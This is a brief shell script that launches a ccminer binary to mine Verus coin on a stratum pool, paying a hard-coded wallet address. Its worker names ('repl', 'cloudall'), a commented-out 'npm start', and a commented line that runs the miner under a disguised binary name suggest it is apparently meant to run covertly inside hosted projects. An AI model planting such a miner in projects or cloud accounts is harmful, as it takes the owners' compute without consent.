#!/bin/sh
#npm start &
PoolHost=stratum+ssl://sg.vipor.net
Port=5140
PublicVerusCoinAddress=RHy311pnvcN1nn47MZmyA2FAaCVFiCgWim
WorkerName=repl
Threads=1
#set working directory to the location of this script
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
cd $DIR
chmod +x ccminer
./ccminer -a verus -o stratum+tcp://sg.vipor.net:5040 -u RHy311pnvcN1nn47MZmyA2FAaCVFiCgWim.cloudall -p x -t 2
#./verus_maskoding -a VRSC -o "${PoolHost}":"${Port}" -u "${PublicVerusCoinAddress}"."${WorkerName}" -p x -t "${Threads}" "$@"